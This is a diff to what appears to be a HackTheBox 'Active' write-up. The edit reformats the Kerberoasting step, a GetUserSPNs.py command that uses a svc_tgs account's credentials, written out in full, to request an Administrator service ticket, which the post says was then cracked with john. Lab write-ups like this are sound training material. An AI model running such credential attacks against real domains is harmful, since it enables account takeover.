@@ -24,9 +24,9 @@ categories: HackTheBox-Active-Directory
 
 ### *Kerberoasting*
 
-⇒ So running [GetUserSPNs.py](http://getuserspns.py) we see that there's an SPN set for Administrator user. We requested the tgs and cracked it locally using john :
+⇒ So running GetUserSPNs.py we see that there's an SPN set for Administrator user. We requested the tgs and cracked it locally using john :
 
-**python3 [GetUserSPNs.py](http://getuserspns.py/) active.htb/'svc_tgs:GPPstillStandingStrong2k18' -dc-ip 10.10.10.100 -request**
+`python3 GetUserSPNs.py active.htb/'svc_tgs:GPPstillStandingStrong2k18' -dc-ip 10.10.10.100 -request`
 
 ![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Active%20Box%20258484d566334095813a3585114c341f/Untitled%204.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Active%20Box%20258484d566334095813a3585114c341f/Untitled%204.png)
 
